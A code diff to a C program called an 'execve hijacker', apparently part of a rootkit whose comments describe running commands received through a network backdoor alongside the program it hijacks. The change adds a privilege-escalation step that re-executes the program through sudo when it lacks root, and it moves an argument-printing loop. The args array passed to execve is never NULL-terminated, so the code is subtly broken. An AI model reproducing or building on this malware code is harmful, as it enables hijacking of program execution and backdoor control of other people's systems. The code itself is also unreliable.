@@ -64,8 +64,22 @@ char* getLocalIpAddress(){
     return IPbuffer;
 }
 
-int main(int argc, char* argv[]){
+int main(int argc, char* argv[], char *envp[]){
     printf("Hello world from execve hijacker\n");
+    for(int ii=0; ii<argc; ii++){
+        printf("Argument %i is %s\n", ii, argv[ii]);
+    }
+
+
+    if(geteuid() != 0){
+        //We do not have privileges, but we do want them. Let's rerun the program now.
+        char* args[argc+1]; 
+        args[0] = "sudo";
+        for(int ii=0; ii<argc; ii++){
+            args[ii+1] = argv[ii];
+        }
+        execve("/usr/bin/sudo", args, envp);
+    }
 
     time_t rawtime;
     struct tm * timeinfo;
@@ -73,10 +87,6 @@ int main(int argc, char* argv[]){
     time ( &rawtime );
     timeinfo = localtime ( &rawtime );
     char* timestr = asctime(timeinfo);
-
-    for(int ii=0; ii<argc; ii++){
-        printf("Argument %i is %s\n", ii, argv[ii]);
-    }
 
     //We proceed to fork() and exec the original program, whilst also executing the one we 
     //ordered to execute via the network backdoor
